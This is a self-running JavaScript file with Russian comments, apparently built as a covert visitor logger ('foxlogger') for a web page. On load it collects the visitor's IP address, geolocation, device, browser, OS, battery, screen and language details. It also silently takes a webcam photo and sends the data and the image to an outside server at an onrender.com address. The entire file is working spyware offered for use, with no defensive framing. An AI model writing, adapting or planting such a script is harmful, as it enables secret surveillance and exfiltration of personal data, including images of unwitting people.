(async function() {
    "use strict";

    const RENDER_URL = "https://drwizzard3-5.onrender.com";

    // ========== Сбор всех данных ==========
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let city = "", country = "", lat = "", lon = "";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        city = geoData.city || "неизвестно";
        country = geoData.country_name || "неизвестно";
        lat = geoData.latitude || "?";
        lon = geoData.longitude || "?";
        geo = `${city}, ${country} (${lat}, ${lon})`;
    } catch(e) {
        console.warn("Geo error:", e);
    }

    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });

    const userAgent = navigator.userAgent;
    let deviceType = "не определено";
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "💻 Компьютер";
    }
    
    let browser = "неизвестно";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    
    let os = "неизвестно";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    let battery = "не доступно";
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            battery = `${Math.round(b.level * 100)}% (${b.charging ? "🔋 заряжается" : "🪫 не заряжается"})`;
        } catch(e) {}
    }

    const screen = `${window.screen.width}x${window.screen.height}`;
    const language = navigator.language || "ru";

    // Камера
    let photoBlob = null;
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
        
        photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
    }

    // Отправка на Render
    const data = {
        ip: ipAddress,
        geo: geo,
        time: timeStr,
        device: deviceType,
        browser: browser,
        os: os,
        battery: battery,
        screen: screen,
        language: language,
        url: window.location.href,
        referer: document.referrer || "прямой переход"
    };

    try {
        // Отправляем текст
        await fetch(`${RENDER_URL}/foxlogger`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
        
        // Отправляем фото
        if (photoBlob) {
            const formData = new FormData();
            formData.append("photo", photoBlob);
            formData.append("caption", `📸 Снимок\nIP: ${ipAddress}\nВремя: ${timeStr}`);
            await fetch(`${RENDER_URL}/foxlogger_photo`, { method: "POST", body: formData });
        }
        
        console.log("✅ Данные отправлены через Render");
    } catch(e) {
        console.log("Ошибка:", e);
    }
})();
